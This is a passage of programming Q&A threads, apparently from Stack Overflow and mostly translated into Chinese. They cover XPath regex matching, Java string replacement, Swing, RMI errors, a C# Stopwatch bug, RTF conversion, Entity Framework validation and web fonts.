**编辑：我忘了提到我仍然需要使用 match 函数，因为我需要不区分大小写的标志。**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-01T21:03:04.790

使用`^`和`$`字符作为锚点怎么样？

```
//cat[descendant-or-self::*[@*[matches(.,'^Cat$')]]] 
```

来自[XQuery 1.0 和 XPath 2.0 中的 RegEx 语法](http://www.w3.org/TR/xquery-operators/#regex-syntax)：

> 添加了两个元字符**^**和**$**。默认情况下，元字符 **^**匹配整个字符串的开头，而**$**匹配整个字符串的结尾。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-01T22:48:42.870

这里有三个相关的函数/运算符。

matches() 进行正则表达式匹配；您可以使用它来匹配子字符串或通过使用锚 (^cat$) 来匹配整个字符串，并且您可以设置 'i' 标志以使其不区分大小写。

contains() 对子字符串进行完全匹配；您可以使用第三个参数（排序规则）来请求不区分大小写的匹配，但指定排序规则的方式取决于您使用的处理器。

eq 运算符对整个字符串进行精确匹配；“默认排序规则”（在 XPath 的情况下，通常使用处理器的 API 设置）可用于请求区分大小写的匹配。这似乎是最接近您的要求的一个，唯一的缺点是指定排序规则比使用带有 match() 的“i”标志更依赖于系统。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-01T20:23:18.497

这对你有用吗？

```
//cat[@*='Cat'] 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-02T01:47:26.397

> 但我想使用匹配来返回仅匹配“Cat”整个单词的结果：
> 
> ```
> <cat name="Cat" color="grey"/> 
> ```

**有不同的 XPath 表达式可以选择想要的元素**：

采用：

```
/*/cat[matches(@name, '^cat$', 'i')] 
```

或使用：

```
/*/cat[lower-case(@name) eq 'cat'] 
```

**基于 XSLT 的验证**：

```
<xsl:stylesheet version="2.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>

 <xsl:template match="/">
  <xsl:copy-of select=
   "/*/cat[matches(@name, '^cat$', 'i')]"/>
======
  <xsl:copy-of select=
   "/*/cat[lower-case(@name) eq 'cat']"/>

 </xsl:template>
</xsl:stylesheet> 
```

**应用于提供的 XML 文档时：**

```
<pets>
    <dog name="Rupert" color="grey"/>
    <dog name="Ralph" color="brown"/>
    <cat name="Marvin the Cat" color="white"/>
    <cat name="Garfield the Cat" color="orange"/>
    <cat name="Cat" color="grey"/>
    <cat name="Fluffy" color="black"/>
</pets> 
```

**此转换计算两个 XPath 表达式并将所选元素复制到输出**：

```
 <cat name="Cat" color="grey"/>
======
  <cat name="Cat" color="grey"/> 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-01T20:24:10.007

这：

```
//cat[@*='Cat'] 
```

结果是：

```
<cat name="Cat" color="grey"/> 
```

我使用[Xacobeo](http://packages.ubuntu.com/natty/xacobeo)进行了验证。

# java - 在两个字符串之间替换一个字符串

> ID：10403639
> 
> 赞同：17
> 
> 时间：2012-05-01T20:09:41.797
> 
> 标签：java, regex

假设我们有类似的东西：

```
&firstString=someText&endString=OtherText 
```

我想用别的东西代替“someText”。考虑到我不知道 someText 可能是什么（任何字符串）并且我所知道的是它将被 &firstString= 和 &endString= 包围，这样做的最佳方法是什么

编辑：抱歉看起来这还不够清楚。我不知道“someText”可能是什么，我唯一掌握的信息是它将在 &firstString= 和 &endString= 之间

我正在考虑多次使用 split 但听起来很难看..

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-05-01T20:20:56.337

您可以使用支持正则表达式的[String#replaceAll ，如下所示：](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#replaceAll%28java.lang.String,%20java.lang.String%29)

```
String newstr = str.replaceAll("(&firstString=)[^&]*(&endString=)", "$1foo$2"); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-01T20:16:50.390

最容易理解的方法是搜索分隔符，并在它们的位置之间剪下一个子字符串，如下所示：

```
String str = "&firstString=someText&endString=OtherText";
String firstDelim = "&firstString=";
int p1 = str.indexOf(firstDelim);
String lastDelim = "&endString=";
int p2 = str.indexOf(lastDelim, p1);   // look after start delimiter    
String replacement = "quick_brown_fox";
if (p1 >= 0 && p2 > p1) {
    String res = str.substring(0, p1+firstDelim.length())
               + replacement
               + str.substring(p2);
    System.out.println(res);
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-01T20:11:59.413

```
yourString.replace("someText", "somethingElse"); 
```

**根据澄清进行编辑**

```
String x = "&firstString=someText&endString=OtherText";
int firstPos = x.indexOf("&firstString=") + "&firstString=".length();
int lastPos = x.indexOf("&endString", firstPos);
String y = x.substring(0,firstPos) + "Your new text" + x.substring(lastPos);
System.out.println(y); 
```

输出：

```
&firstString=Your new text&endString=OtherText 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-01T20:19:06.690

据我了解这个问题，你应该做这样的事情，但我不确定我是否完全明白你的要求：

```
yourString = firstString + replacingString + endString; 
```

如果您想要“替换”字符串：

```
replacedString = wholeString.substring(0, wholeString.lastIndexOf(endString) - 1);
replacedString = tempString.substring(firstString.length() + 1); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-10-01T16:16:27.520

该解决方案检查我们是否没有结束字符串，并且会多次出现。

```
 int startIndex = text.indexOf(startDelim);
 while (startIndex > -1)
 {
    int endIndex = text.indexOf(endDelim, startIndex);
    String endPart = "";

    if ((endIndex + endDelim.length()) < text.length())
       endPart = text.substring(endIndex + endDelim.length());

    text = text.substring(0, startIndex) + replacementText + endPart;
    startIndex = text.indexOf(startDelim);
 } 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-05-01T20:11:46.150

只是替换整个`&firstString=someText&`，因为这包括我认为与 URL 相关的外部障碍？

# java - 自定义组件

> ID：10403640
> 
> 赞同：1
> 
> 时间：2012-05-01T20:09:51.790
> 
> 标签：java, swing, jtextfield

我正在创建一个 Swing GUI，我正在使用一系列`JTextField`. 我希望能够向文本字段添加自定义属性。例如，这将用于在失去焦点时完成计算。

```
JTextField1.getCustomePram() * user input 
```

我想要一个具有预定义值的文本字段，它用于乘以 £20 * 5。因此默认参数将为 20，用户将输入数量，并且在失去焦点时将完成计算。

我正在使用 Netbeans 构建 GUI，我尝试过扩展`JTextField`但老实说我不知道​​该怎么做，任何建议或者如果我完全错误，请告诉我。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T20:49:33.243

> 我想要一个具有预定义值的文本字段，它用于乘以 £20 * 5。因此默认参数将为 20，用户将输入数量，并且在失去焦点时将完成计算。..如果我完全错了，请告诉我。

你这样做是完全错误的。

为此，我可能会使用禁用的文本字段或标签作为单价（20 英镑），使用 a[`JSpinner`](http://docs.oracle.com/javase/7/docs/api/javax/swing/JSpinner.html)作为数量（5）。与其对焦点丢失进行计算，不如[添加一个更改侦听](http://docs.oracle.com/javase/7/docs/api/javax/swing/JSpinner.html#addChangeListener%28javax.swing.event.ChangeListener%29)器并“实时”向用户显示订购项目的新小计（如果相关，则为总计） - 当数量发生变化时。

> 需要看看我需要如何在 Java 中实现想法。

一个不错的地方是[Swing Components 的 Visual Guide](http://docs.oracle.com/javase/tutorial/ui/features/components.html)。将它们组合到复杂的组件组的布局中。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-01T20:14:23.777

正如 user1329572 所说，您需要子类化（或*扩展*）`JTextField`. 您可以按如下方式执行此操作：

```
public class MyTextField extends javax.swing.JTextField {
    private String /* or whatever type */ myCustomParam;

    public String getCustomParam() {
        return myCustomParam;
    }

    public void setCustomParam(String param) {
        myCustomParam = param;
    }
} 
```

任何需要使用 a 的地方`JTextField`，也可以使用 a `MyTextField`。所有其他功能仍然有效。

关于焦点：要检测焦点，请使用`FocusAdapter`：

```
MyTextField mtf = new MyTextField();
mtf.addFocusListener(new java.awt.event.FocusAdapter() {
    @Override
    public void focusLost(java.awt.event.FocusEvent e) {
        System.out.println("I lost focus.");
    }
} 
```

# ip - 带有 IP 的 RMI - ClassNotFoundException、UnmarshalException、ServerException

> ID：10403642
> 
> 赞同：0
> 
> 时间：2012-05-01T20:09:57.027
> 
> 标签：ip, rmi, classnotfoundexception

有谁可以帮助我使用 ip 建立 rmi 服务器。我已经在网上搜索了几天，但无法解决我的问题。

客户

```
public static void main(String[] agrcs) throws RemoteException, NotBoundException, MalformedURLException {
    if (System.getSecurityManager() == null) {     System.setProperty("java.security.policy", "F:\\škola\\pg2\\LodeSemestralka\\java.policy");

        System.setSecurityManager(new RMISecurityManager());
    }
    String ip = agrcs[0];
    Integer port = new Integer(agrcs[1]);

        server = (ShipServer) Naming.lookup("//"+ip+":"+port+"/"+SERVER_NAME);
} 
```

服务器

```
static public void main(String[] agrcs) throws RemoteException {
    if (System.getSecurityManager() == null) {
        System.setProperty("java.security.policy", "F:\\škola\\pg2\\LodeSemestralka\\java.policy");
        System.setSecurityManager(new RMISecurityManager());
    }

    String ip = agrcs[0];
    Integer port = new Integer(agrcs[1]);

    playground = new Playground();
    try {
        Naming.bind("//" + ip + ":" + port + "/" + SERVER_NAME, playground);
    } catch (Exception ex) {
        playground = null;
        ex.printStackTrace();
    } 
```

调用服务器时，它会抛出

```
java.rmi.ServerException: RemoteException occurred in server thread; nested exception is: 
    java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is: 
    java.lang.ClassNotFoundException: lode.gameCore.Playground
    at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:413)
    at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:267)
    at sun.rmi.transport.Transport$1.run(Transport.java:177)
    at sun.rmi.transport.Transport$1.run(Transport.java:174)
    at java.security.AccessController.doPrivileged(Native Method)
    at sun.rmi.transport.Transport.serviceCall(Transport.java:173)
    at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:553)
    at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:808)
    at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:667)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:722)
    at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:273)
    at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:251)
    at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:377)
    at sun.rmi.registry.RegistryImpl_Stub.bind(Unknown Source)
    at java.rmi.Naming.bind(Naming.java:128)
    at server.Server.main(Server.java:38)
    at lode.game.StartUpScreen.createNewGame(StartUpScreen.java:186)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.jdesktop.application.ApplicationAction.noProxyActionPerformed(ApplicationAction.java:662)
    at org.jdesktop.application.ApplicationAction.actionPerformed(ApplicationAction.java:698)
    at javax.swing.AbstractButton.fireActionPerformed(AbstractButton.java:2018)
    at javax.swing.AbstractButton$Handler.actionPerformed(AbstractButton.java:2341)
    at javax.swing.DefaultButtonModel.fireActionPerformed(DefaultButtonModel.java:402)
    at javax.swing.DefaultButtonModel.setPressed(DefaultButtonModel.java:259)
    at javax.swing.plaf.basic.BasicButtonListener.mouseReleased(BasicButtonListener.java:252)
    at java.awt.AWTEventMulticaster.mouseReleased(AWTEventMulticaster.java:289)
    at java.awt.Component.processMouseEvent(Component.java:6504)
    at javax.swing.JComponent.processMouseEvent(JComponent.java:3321)
    at java.awt.Component.processEvent(Component.java:6269)
    at java.awt.Container.processEvent(Container.java:2229)
    at java.awt.Component.dispatchEventImpl(Component.java:4860)
    at java.awt.Container.dispatchEventImpl(Container.java:2287)
    at java.awt.Component.dispatchEvent(Component.java:4686)
    at java.awt.LightweightDispatcher.retargetMouseEvent(Container.java:4832)
    at java.awt.LightweightDispatcher.processMouseEvent(Container.java:4492)
    at java.awt.LightweightDispatcher.dispatchEvent(Container.java:4422)
    at java.awt.Container.dispatchEventImpl(Container.java:2273)
    at java.awt.Window.dispatchEventImpl(Window.java:2713)
    at java.awt.Component.dispatchEvent(Component.java:4686)
    at java.awt.EventQueue.dispatchEventImpl(EventQueue.java:707)
    at java.awt.EventQueue.access$000(EventQueue.java:101)
    at java.awt.EventQueue$3.run(EventQueue.java:666)
    at java.awt.EventQueue$3.run(EventQueue.java:664)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDomain.java:76)
    at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDomain.java:87)
    at java.awt.EventQueue$4.run(EventQueue.java:680)
    at java.awt.EventQueue$4.run(EventQueue.java:678)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDomain.java:76)
    at java.awt.EventQueue.dispatchEvent(EventQueue.java:677)
    at java.awt.EventDispatchThread.pumpOneEventForFilters(EventDispatchThread.java:211)
    at java.awt.EventDispatchThread.pumpEventsForFilter(EventDispatchThread.java:128)
    at .... 
```

在 lode.gameCore 中是`public interface ShipServer extends Remote {...}`和`public class Playground implements ShipServer, Serializable {...}`

我使用的是 LocaleRegistry，它可以完美运行，但只能在一台 PC 上运行。我需要通过网络使用带有 IP 的 RMI 在更多 PC 上运行应用程序，以进行通信等。

在 java.policy 中是`grant {permission java.security.AllPermission;};`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T04:09:33.213

```
java.lang.ClassNotFoundException: lode.gameCore.Playground(Unknown Source)
    ...
    at java.rmi.Naming.bind(Naming.java:128) 
```

RMI 注册表在其 CLASSPATH 中没有该类。Registry 需要远程接口、存根（如果有）以及它们所依赖的任何应用程序类，依此类推，直到关闭。

# jsp - 将请求转发到特定帧

> ID：10403649
> 
> 赞同：0
> 
> 时间：2012-05-01T20:10:25.040
> 
> 标签：jsp, servlets

有谁知道如何将请求转发到特定框架？

我用：

```
 dispatcher = getServletContext().getRequestDispatcher("/servlet/MyServlet" );
    dispatcher.forward( request, response ); 
```

有没有办法在这样的请求转发中定义目标框架（TARGET='myFrame'）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:11:19.737

不，不可能`target`从服务器端指定。想象一下，如果可以`target="_blank"`从服务器端指定 a 会发生什么。

您需要在客户端指定它。您可以在其或指向相关 servlet 的元素中指定`target`属性。`<form>``<a>``action``href`

作为替代方案，您可以采用基于无框架 ajax 的方法。在 JavaScript 中，可以根据 servlet 响应动态遍历/操作 HTML DOM 树。无论如何，框架太 90 年代了。

# c# - 为什么我的秒表不加时间？

> ID：10403656
> 
> 赞同：0
> 
> 时间：2012-05-01T20:10:48.927
> 
> 标签：c#, .net, class, static, stopwatch

该课程不会使用 Speedrun.AddToTime(h, m, s) 添加到秒表时间

不知道为什么！

```
class Speedrun
    {
        private static Stopwatch sr = new Stopwatch();

        public static void Go()
        {
            sr.Reset();
            sr.Start();
        }

        public static string GetTime
        {
            get
            {
                return sr.Elapsed.Hours + "h " + sr.Elapsed.Minutes + "m " + sr.Elapsed.Seconds + "s";
            }

        }

        public static void AddToTime(int hours, int minutes, int seconds)
        {
            TimeSpan ts = new TimeSpan(hours, minutes, seconds);
            sr.Elapsed.Add(ts);

        }

        public static void Stop()
        {
            sr.Stop();
        }

        public static void Cont()
        {
            sr.Start();
        }
    } 
```

相当直截了当，我使用类名本身而不是变量来引用它。如此处所见

```
Speedrun.Go(); 
```

任何帮助将不胜感激！

**更新！！**

在这里找到的廉价解决方案是为了帮助可能有类似情况的人

```
class Speedrun
{
    private static Stopwatch sr = new Stopwatch();

    private static int addedhours = 0;
    private static int addedminutes = 0;
    private static int addedseconds = 0;

    public static void Go()
    {
        sr.Reset();
        sr.Start();
        addedhours = 0;
        addedminutes = 0;
        addedseconds = 0;
    }

    public static string GetTime
    {
        get
        {
            return (sr.Elapsed.Hours + addedhours) + "h " + (sr.Elapsed.Minutes + addedminutes) + "m " + (sr.Elapsed.Seconds + addedseconds) + "s";
        }

    }

    public static void AddToTime(int hours, int minutes, int seconds)
    {
        addedhours = addedhours + hours;
        addedminutes = addedminutes + minutes;
        addedseconds = addedseconds + seconds;

    }

    public static void Stop()
    {
        sr.Stop();
    }

    public static void Cont()
    {
        sr.Start();
    }
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-01T20:12:47.207

您正在`Add`调用`TimeSpan`. `TimeSpan`是*不可变*的值类型。你对这里的结果什么都不做：

```
sr.Elapsed.Add(ts); 
```

......所以它实际上是一个无操作。即使`TimeSpan`是不可变的，它仍然是一个值类型 - 所以你会获取属性值（这将制作一个副本），然后调用`Add`，然后变异的副本将丢失。

基本上，你在这里尝试做的事情是行不通的。

编辑：您的解决方法也不起作用，因为如果花费了 35 秒并且您增加了 30 秒，那么您最终将报告 65 秒而不是 1 分 5 秒。

您应该只保留 a`TimeSpan`添加，然后您可以使用以下内容：

```
public static string GetTime
{
    get
    {
        TimeSpan time = sr.Elapsed + timeToAdd;
        // In .NET 4 you could use a custom format string for the TimeSpan
        return string.Format("{0}h {1}m {2}s",
                             time.Hours, time.Minutes, time.Seconds);
    }
} 
```

不过，我对整体设计有些怀疑——特别是，所有这些没有任何线程安全尝试的静态让我感到紧张......你真的*需要*所有这些都是静态的吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:15:00.953

`StopWatch.Elapsed`返回一个新`TimeSpan`对象。调用`Add`该对象会创建另一个`TimeSpan`对象，然后您将其丢弃。

您没有将任何内容写回您的`StopWatch`对象。

尝试这个：

```
class Speedrun
{
    private static Stopwatch sr = new Stopwatch();
    private static TimeSpan elapsed = new TimeSpan();

    public static void Go()
    {
        elapsed = new TimeSpan(0);
        sr.Reset();
        sr.Start();
    }

    public static string GetTime
    {
        get
        {
            elapsed = elapsed.Add(sr.Elapsed);
            return elapsed.Hours + "h " + elapsed.Minutes + "m " + elapsed.Seconds + "s";
        }

    }

    public static void AddToTime(int hours, int minutes, int seconds)
    {
        TimeSpan ts = new TimeSpan(hours, minutes, seconds);
        elapsed = elapsed.Add(ts);
    }

    public static void Stop()
    {
        sr.Stop();
    }

    public static void Cont()
    {
        sr.Start();
    }
} 
```

仅供参考，`GetTime`是*方法*的适当名称。一个更好的*属性*名称应该是`Time`or `ElapsedTime`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T20:15:04.290

TimeSpan.Add() 不会修改现有值，而是返回一个新的结果 TimeSpan。所以你需要改变：

```
sr.Elapsed.Add(ts); 
```

...以便它实际上将结果存储在有用的地方。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-01T20:14:59.190

请参阅[http://msdn.microsoft.com/en-us/library/system.timespan.add.aspx](http://msdn.microsoft.com/en-us/library/system.timespan.add.aspx)

Add 返回一个新的 TimeSpan 对象而不是改变现有的对象，并且由于 StopWatch.Elapsed 是只读的，我不知道您是否可以完成您正在尝试的事情

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-06-30T12:50:23.727

这是我的解决方案...

```
public class StopwatchPlus : Stopwatch
{
    private TimeSpan AddedTime { get; set; }
    public StopwatchPlus() { AddedTime = new TimeSpan(0); }
    public TimeSpan Elapsed { get { return base.Elapsed.Add(AddedTime); } }
    public void Add(TimeSpan time) { AddedTime = AddedTime.Add(time); }
} 
```

# email - 从服务器电子邮件中收集特定数据（交付失败报告）

> ID：10403661
> 
> 赞同：1
> 
> 时间：2012-05-01T20:11:06.617
> 
> 标签：email, text, preg-match, webmail

最近，我向我拥有的一个旧电子邮件数据库发送了一份时事通讯。在创建了几年后，这些电子邮件中似乎有大约 30% 处于非活动状态 - 我收到了数千封邮件传递失败消息。

所有这些失败通知都以文本文件的形式存储在我的服务器上，它们是包含我发送给订阅者的文本的回复。每封电子邮件的文本中都有用户 ID。这个 id 前面有一些常见的文本，比如

```
<a href="abc.com?id=123321"></a> 
```

我想从我收到的每个故障报告中提取“123321”。

首先，我开始手动执行此操作并一一收集所有内容。在收到 500 封电子邮件后，我的眼睛感觉在地板上，我确信有一个使用 php 和一些功能的解决方案。我正在考虑将它们全部放入一个大文件中，并找到一种 preg_match 方法来做到这一点，或者尝试使用正则表达式。

您将如何处理这样的问题，我应该在哪里寻找解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-02T05:23:30.627

对于小数据样本，这似乎对我有用。只要您不会因为尝试一次加载所有数据而耗尽内存，它就应该可以工作：

```
$data = file_get_contents("data.txt");
preg_match_all('#(?<=<a href="abc\.com\?id=)\d+(?="></a>)#',$data,$matches);
print_r($matches); 
```

# ruby - 工作多个打开的相同类型的浏览器

> ID：10403671
> 
> 赞同：-2
> 
> 时间：2012-05-01T20:11:26.727
> 
> 标签：ruby, watir-webdriver

如何在相同类型的不同打开浏览器上工作。我在 IE 或 Firefox 的单个浏览器上工作，将其命名为“@browser ....”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T20:16:17.367

只需创建浏览器对象的第二个实例，例如创建一个 @browser1 和一个 @browser2

# winforms - Converting from rich text format to plain text problems

> ID：10403678
> 
> 赞同：4
> 
> 时间：2012-05-01T20:11:46.193
> 
> 标签：winforms, rtf

We currently have an application (Windows service) that connects to another of our applications and grabs invoices. In the invoices there is a RTF field for the footer/header fields. When we grab the data the RTF is converted to plain text with the following code:

```
public static string ConvertFromRTFToPlainText(string rtfString)
{
    if (rtfString == null)
        return null; 

    System.Windows.Forms.RichTextBox rtBox = new System.Windows.Forms.RichTextBox();

    if (rtfString.StartsWith("{\\rtf1"))
        rtBox.Rtf = rtfString;
    else
        rtBox.Text = rtfString;

    return rtBox.Text;
} 
```

This has worked for the most part but in some cases (one particular client gets it everytime) I get this exception:

```
Exception Message:Error creating window handle.
Stack trace:
at System.Windows.Forms.NativeWindow.CreateHandle(CreateParams cp)
at System.Windows.Forms.Control.CreateHandle()
at System.Windows.Forms.TextBoxBase.CreateHandle()
at System.Windows.Forms.RichTextBox.set_Rtf(String value)
at SmartTrade.Common.API.Tools.RTFHelperUtility.ConvertFromRTFToPlainText(String rtfString)
at SmartTrade.Desktop.Proxy.API.ObjectMapper.InvoiceObjectMapper.CovertToAPIInvoice(Invoice domainInvoice) 
```

Any help on why this is happening or how we can work around it would be much appreciated.

**Edit**: Thanks to Jeremy for the explanation, I am after suggestions for RTF conversion alternatives.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:25:58.433

I would say this is probably thrown on terminal type machines that don't have the UI libraries installed? Or possibly don't have them loaded (ie - if no user is logged in)

It's generally not a great idea to use UI libraries in a service, because there is no guarantee that those libraries are accessible if no user is logged in.

I would find a different way to remove the RTF formatting

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-10T21:28:11.200

I ended up using this. I know that it may not parse 100% of RTF text but we ran it against our live data to test it and it works fine for our purposes.

```
Regex.Replace(rtfString, @"\{\*?\\[^{}]+}|[{}]|\\\n?[A-Za-z]+\n?(?:-?\d+)?[ ]?", ""); 
```

# google-drive-api - 为什么文件更新有时会返回 drive:v1 作为文件 ID？

> ID：10403679
> 
> 赞同：0
> 
> 时间：2012-05-01T20:11:47.603
> 
> 标签：google-drive-api

在多次成功的文件更新后，有一次更新返回的文件 id 是 drive:v1 而不是有效的文件 id。此外，根据 App Engine 日志，有问题的请求需要 10 秒（通常不到 1 秒），而不是因为 App Engine 实例启动时间非常奇怪。

我使用的代码基于 Google Drive SDK Python 示例应用程序 DrEdit，并且只做了一些修改（我添加了 Base64 编码，因为我传输的是微小的图像，而不是文本）。

更具体地说，在 ServiceHandler 类的 put 方法的示例代码中，这段代码应该在更新文件后返回文件 id：

```
# Respond with the new file id as JSON.
  self.RespondJSON(resource['id']) 
```

这工作了很多次，但有一次它返回驱动器：v1。更新仍然正确地更改了文件，除了文件 id 问题之外，请求正常工作。

这是我对受此影响的示例代码部分所做的修改：

```
resource = service.files().update(
  id=data['resource_id'],
  newRevision=True,
  body=None,
  media_body=MediaInMemoryUpload(base64.b64decode(data.get('content', '')),
                                           data['mimeType']),
).execute() 
```

顺便说一句，put 方法中的注释“使用新的文件 ID 作为 JSON 响应”使它看起来在更新文件后文件 ID 会更改，但似乎并非如此。这很令人困惑，除非文件 id 有时在更新后确实发生了变化，否则更改它可能是一个好主意。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T22:06:17.057

我试过了，但我无法重现这个。有什么方法可以让您定期复制它的样本？

另外，感谢您提出有关评论的问题，我现在会更新。

编辑：在[http://code.google.com/p/google-drive-sdk-samples/source/detail?r=233b6db987f633ff34929247f9045feca7550688中更新了评论](http://code.google.com/p/google-drive-sdk-samples/source/detail?r=233b6db987f633ff34929247f9045feca7550688)

# c# - 实体框架 IsRequired 与 AllowEmptyStrings=false

> ID：10403687
> 
> 赞同：2
> 
> 时间：2012-05-01T20:12:33.370
> 
> 标签：c#, entity-framework-4.1

我有一个实体属性定义如下

```
 public virtual string Subject { get; set; } 
```

并将其映射为

```
 this.Property(t => t.Subject)
                .IsRequired()
                .HasMaxLength(255); 
```

但这不提供对空字符串的验证。我可以使用 fluent api 指定以下约束吗？

```
[Required(AllowEmptyStrings=false)]
        public virtual string Subject { get; set; } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:28:51.817

不，您不能，因为 fluent-api 描述了到数据库的映射，而带有不允许空字符串的属性描述了验证。只有验证规则的子集可以转换为映射。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:23:44.937

您是否尝试覆盖`OnModelCreating`DbContext 类中的方法？

```
protected override void OnModelCreating(DbModelBuilder modelBuilder)
{
  modelBuilder.Entity<Message>().Property(x => x.Subject).IsRequired();
  base.OnModelCreating(modelBuilder);
} 
```

# javascript - 创建自定义联系我们地图的最佳方式

> ID：10403693
> 
> 赞同：1
> 
> 时间：2012-05-01T20:12:52.297
> 
> 标签：javascript, jquery, html

我想创建一个包含不同区域的地图。当区域翻转时，该区域会亮起并链接到该特定区域。

最好使用 HTML 图像映射吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:19:55.020

在这种情况下，“最佳”是一个高度相关的概念。

许多开发人员认为 HTML 图像映射“已弃用”，尽管实际上并非如此。虽然 CSS 定位的覆盖在矩形区域中效果很好，有时甚至更好，但图像映射特别适合处理圆形和/或多边形区域。

但是，如果您希望在将鼠标悬停在特定区域上时图像“亮起”，那么您遇到了一个棘手的问题。当然，仅使用图像和 CSS/JavaScript 来解决这个问题是可能的——我去年写了一个 jQuery 插件来自动化这个过程以完成一项工作——但是存在其他使用 SVG/Canvas 图形处理它的插件。

领先的插件在[这里](http://davidlynch.org/projects/maphilight/docs/)。

# css - Garamond 真的是一种网络安全字体吗？

> ID：10403696
> 
> 赞同：20
> 
> 时间：2012-05-01T20:13:04.447
> 
> 标签：css, font-face, typography

Garamond 真的是网络安全的吗？我应该继续使用它吗？我知道它在 XP 中不存在（Georgia 是后备），但是，其他操作系统呢？它是否存在于 Mac、新 Windows 和 linux 中？

我知道我可以简单地做一个@font-face，但是，如果我嵌入它，它在谷歌浏览器中看起来很可怕。

**编辑**

好吧，如果我这样做

```
@import url(http://fonts.googleapis.com/css?family=EB+Garamond);
html{font-family: Garamond, EB Garamond, Georgia, serif;} 
```

会，这样网络浏览器将首先检查是否安装了 Garamond，如果没有，加载将加载网络字体 EB Garamond，或者这不会发生？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-05-01T20:16:04.090

我不相信它是在所有计算机上使用的安全字体。您可以使用字体并通过使用字体系列将另一种字体用作备份。比如这样：

```
font-family:Garamond, Georgia, serif; 
```

有关网络安全字体的更多信息，请参见此处 -> [http://www.ampsoft.net/webdesign-l/WindowsMacFonts.html](http://www.ampsoft.net/webdesign-l/WindowsMacFonts.html)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-01T20:18:05.083

除了一个[非常短的列表](http://www.ampsoft.net/webdesign-l/WindowsMacFonts.html)之外，您不应该依赖每个人在他们的计算机上拥有各种字体系列。

相反，试试[Google WebFonts](https://www.google.com/fonts/)。事实上，使用左侧的搜索框找到他们的 Garamond 等价物。适用于所有浏览器（包括较旧的 IE！）并且在任何地方看起来都很棒。

编辑

关于您的其他问题，是的，浏览器将按照您指定的顺序查找字体，因此如果在用户计算机中可用，将“Garamond”放在“EB Garamond”之前将显示 Garamond。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-07-12T16:48:45.893

为了使字体在小尺寸的平台上看起来始终如一，必须很好地暗示它 - 否则它只会在那些默认为非常柔和、轻微暗示的字体平滑的平台上看起来不错，比如 Mac - 而且它看起来很糟糕Windows，它将应用最强的提示并尝试使它们看起来非常清晰，这确实需要字体中内置的提示才能很好地工作。

EB Garamond 是 Garamond 的免费复制品，它具有令人印象深刻的字形范围，但几乎不关注屏幕渲染 - 因此它缺乏体面的暗示将确保它在某些平台上的小尺寸下看起来很糟糕，尤其是 Windows。 ~~尽管~~Vista/7/8 稍微改进了字体渲染~~, 它只在某些应用程序中这样做 - 其他应用程序，特别是 Google Chrome，使用旧字体渲染~~. *2015 年 8 月编辑 - Google Chrome 不再适用。*

